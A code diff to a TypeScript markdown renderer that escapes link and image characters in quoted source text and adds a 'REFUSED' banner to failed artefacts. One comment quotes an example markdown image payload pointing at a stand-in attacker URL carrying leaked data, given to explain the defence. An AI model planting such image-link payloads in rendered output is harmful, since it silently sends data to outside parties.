@@ -15,6 +15,12 @@ const esc = (s: string): string =>
  * so authored content (arbitrary source-document quotes, questions,
  * statements) cannot forge markdown structure or smuggle raw HTML into
  * renderers (Confluence, GitHub, …) that interpret this output.
+ *
+ * `[`, `]`, `(`, `)` and `!` are in the set for a reason worth stating: a
+ * `grounding.quote` is copied verbatim out of an ingested document, so a source
+ * page containing `![](https://attacker/?leak=…)` would otherwise become a live
+ * image request — a tracking pixel — the moment anyone opens the projection.
+ * Link and image syntax is structure, and structure here is never authored.
  */
 const mdEsc = (s: string): string =>
   s
@@ -23,6 +29,11 @@ const mdEsc = (s: string): string =>
     .replace(/>/g, "&gt;")
     .replace(/`/g, "\\`")
     .replace(/\|/g, "\\|")
+    .replace(/!/g, "\\!")
+    .replace(/\[/g, "\\[")
+    .replace(/\]/g, "\\]")
+    .replace(/\(/g, "\\(")
+    .replace(/\)/g, "\\)")
     .replace(/\n/g, " ");
 
 const STYLE = `
@@ -319,6 +330,20 @@ function mdResiduals(body: ReqsBody): string {
     .join("\n");
 }
 
+/**
+ * The markdown counterpart of `bannerHtml`. A refused artefact must be
+ * distinguishable from a passed one AS A FILE, wherever the file travels — a
+ * markdown projection with no stamp is a refused artefact that reads clean.
+ */
+function bannerMd(findings: Finding[] | undefined): string {
+  const errors = (findings ?? []).filter((f) => f.severity === "error");
+  if (errors.length === 0) return "";
+  const items = errors.map(
+    (f) => `> - \`${mdEsc(f.id)}\` · ${mdEsc(f.path)} — ${mdEsc(f.message)}`,
+  );
+  return `> **⛔ REFUSED**\n>\n${items.join("\n")}\n\n`;
+}
+
 function mdSignoff(body: ReqsBody): string {
   const signoff = body.signoff;
   if (signoff === undefined) return "_not yet signed off_";
@@ -328,14 +353,14 @@ function mdSignoff(body: ReqsBody): string {
   return `Result: **${mdEsc(signoff.result)}**\n\n${approvers}`;
 }
 
-export function renderMarkdown(body: ReqsBody): string {
+export function renderMarkdown(body: ReqsBody, findings?: Finding[]): string {
   const m = body.metadata;
   const cov = body.coverage;
   const covLine =
     cov !== undefined
       ? `\n- coverage: ${cov.leaves} leaves · ${cov.acs} ACs · ${cov.grounded} grounded · ${cov.escalated} escalated · ${cov.carried} carried`
       : "";
-  return `# ${mdEsc(m.workItem)} — ${mdEsc(m.title)}
+  return `${bannerMd(findings)}# ${mdEsc(m.workItem)} — ${mdEsc(m.title)}
 
 - corpus mode: **${m.corpusMode}**
 - created: ${m.createdAt}
